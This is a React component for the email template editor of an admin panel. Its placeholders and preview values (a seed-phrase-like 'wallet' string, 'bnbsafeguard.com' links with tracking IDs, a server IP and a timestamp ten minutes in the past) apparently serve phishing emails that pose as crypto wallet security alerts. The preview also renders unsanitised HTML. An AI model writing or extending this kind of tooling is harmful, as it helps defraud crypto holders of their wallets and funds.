
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { ArrowLeft, Eye, Code, Save } from 'lucide-react';
import { useMutation, useQueryClient, useQuery } from '@tanstack/react-query';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface EmailTemplateEditorProps {
  template?: any;
  onCancel: () => void;
}

const EmailTemplateEditor = ({ template, onCancel }: EmailTemplateEditorProps) => {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [name, setName] = useState(template?.name || '');
  const [subject, setSubject] = useState(template?.subject || '');
  const [content, setContent] = useState(template?.content || '');
  const [variables] = useState(['{{name}}', '{{first_name}}', '{{email}}', '{{phone}}', '{{wallet}}', '{{current_ip}}', '{{link}}', '{{home_link}}', '{{current_time_minus_10}}']);
  const [isPreview, setIsPreview] = useState(false);

  // Fetch current server IP for preview
  const { data: serverConfig } = useQuery({
    queryKey: ['server-config'],
    queryFn: async () => {
      const { data, error } = await supabase
        .from('server_config')
        .select('current_server_ip')
        .single();
      
      if (error && error.code !== 'PGRST116') {
        throw error;
      }
      return data;
    },
  });

  const saveTemplateMutation = useMutation({
    mutationFn: async (templateData: any) => {
      if (template) {
        const { error } = await supabase
          .from('email_templates')
          .update(templateData)
          .eq('id', template.id);
        if (error) throw error;
      } else {
        const { error } = await supabase
          .from('email_templates')
          .insert([templateData]);
        if (error) throw error;
      }
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['email-templates'] });
      toast({
        title: "Success",
        description: template ? "Template updated successfully" : "Template created successfully",
      });
      onCancel();
    },
    onError: (error) => {
      console.error('Save error:', error);
      toast({
        title: "Error",
        description: "Failed to save template",
        variant: "destructive",
      });
    },
  });

  const handleSave = () => {
    if (!name.trim() || !subject.trim() || !content.trim()) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    saveTemplateMutation.mutate({
      name: name.trim(),
      subject: subject.trim(),
      content: content.trim(),
      variables,
    });
  };

  const insertVariable = (variable: string) => {
    const textarea = document.getElementById('content') as HTMLTextAreaElement;
    if (textarea) {
      const start = textarea.selectionStart;
      const end = textarea.selectionEnd;
      const newContent = content.substring(0, start) + variable + content.substring(end);
      setContent(newContent);
      
      // Restore cursor position
      setTimeout(() => {
        textarea.focus();
        textarea.setSelectionRange(start + variable.length, start + variable.length);
      }, 0);
    }
  };

  const getPreviewContent = () => {
    let preview = content;
    const currentServerIp = serverConfig?.current_server_ip ? String(serverConfig.current_server_ip) : '127.0.0.1';
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');
    
    preview = preview.replace(/{{name}}/g, 'John Doe');
    preview = preview.replace(/{{first_name}}/g, 'John');
    preview = preview.replace(/{{email}}/g, 'john.doe@example.com');
    preview = preview.replace(/{{phone}}/g, '+1234567890');
    preview = preview.replace(/{{wallet}}/g, 'bright ocean wave crystal mountain forest ancient wisdom flowing energy');
    preview = preview.replace(/{{current_ip}}/g, currentServerIp);
    preview = preview.replace(/{{link}}/g, 'https://fr.bnbsafeguard.com/?=SAMPLE123');
    preview = preview.replace(/{{home_link}}/g, 'https://fr.bnbsafeguard.com/?=3452');
    preview = preview.replace(/{{current_time_minus_10}}/g, formattedTime);
    return preview;
  };

  return (
    <div>
      <div className="flex items-center gap-4 mb-6">
        <Button
          variant="outline"
          onClick={onCancel}
          className="border-gray-600 text-gray-300 hover:bg-gray-600"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back
        </Button>
        <h1 className="text-2xl font-bold text-yellow-400">
          {template ? 'Edit Email Template' : 'Create Email Template'}
        </h1>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2">
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white">Template Details</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label htmlFor="name" className="text-gray-300">Template Name *</Label>
                <Input
                  id="name"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  placeholder="Enter template name"
                  className="bg-gray-700 border-gray-600 text-white"
                />
              </div>

              <div>
                <Label htmlFor="subject" className="text-gray-300">Email Subject *</Label>
                <Input
                  id="subject"
                  value={subject}
                  onChange={(e) => setSubject(e.target.value)}
                  placeholder="Enter email subject"
                  className="bg-gray-700 border-gray-600 text-white"
                />
              </div>

              <div>
                <div className="flex items-center justify-between mb-2">
                  <Label htmlFor="content" className="text-gray-300">Email Content *</Label>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant={!isPreview ? "default" : "outline"}
                      onClick={() => setIsPreview(false)}
                      className="text-xs"
                    >
                      <Code className="h-3 w-3 mr-1" />
                      Code
                    </Button>
                    <Button
                      size="sm"
                      variant={isPreview ? "default" : "outline"}
                      onClick={() => setIsPreview(true)}
                      className="text-xs"
                    >
                      <Eye className="h-3 w-3 mr-1" />
                      Preview
                    </Button>
                  </div>
                </div>
                
                {!isPreview ? (
                  <Textarea
                    id="content"
                    value={content}
                    onChange={(e) => setContent(e.target.value)}
                    placeholder="Enter email content (HTML supported)"
                    className="bg-gray-700 border-gray-600 text-white min-h-[300px]"
                  />
                ) : (
                  <div 
                    className="bg-white border border-gray-600 rounded-md p-3 min-h-[300px] text-black"
                    dangerouslySetInnerHTML={{ __html: getPreviewContent() }}
                  />
                )}
              </div>

              <div className="flex gap-4 pt-4">
                <Button
                  onClick={handleSave}
                  disabled={saveTemplateMutation.isPending}
                  className="bg-yellow-600 hover:bg-yellow-700 text-black"
                >
                  <Save className="h-4 w-4 mr-2" />
                  {saveTemplateMutation.isPending ? 'Saving...' : 'Save Template'}
                </Button>
                <Button
                  variant="outline"
                  onClick={onCancel}
                  className="border-gray-600 text-gray-300 hover:bg-gray-600"
                >
                  Cancel
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        <div>
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white">Available Variables</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-gray-400 text-sm mb-4">
                Click on any variable to insert it into your template
              </p>
              <div className="space-y-2">
                {variables.map((variable) => (
                  <Badge
                    key={variable}
                    variant="outline"
                    className="cursor-pointer border-gray-500 text-gray-300 hover:bg-gray-600 block w-full justify-start"
                    onClick={() => insertVariable(variable)}
                  >
                    {variable}
                  </Badge>
                ))}
              </div>
              <div className="mt-4 p-3 bg-gray-700 rounded-lg">
                <p className="text-gray-300 text-xs">
                  <strong>Current Server IP:</strong> {serverConfig?.current_server_ip ? String(serverConfig.current_server_ip) : '127.0.0.1'}
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default EmailTemplateEditor;
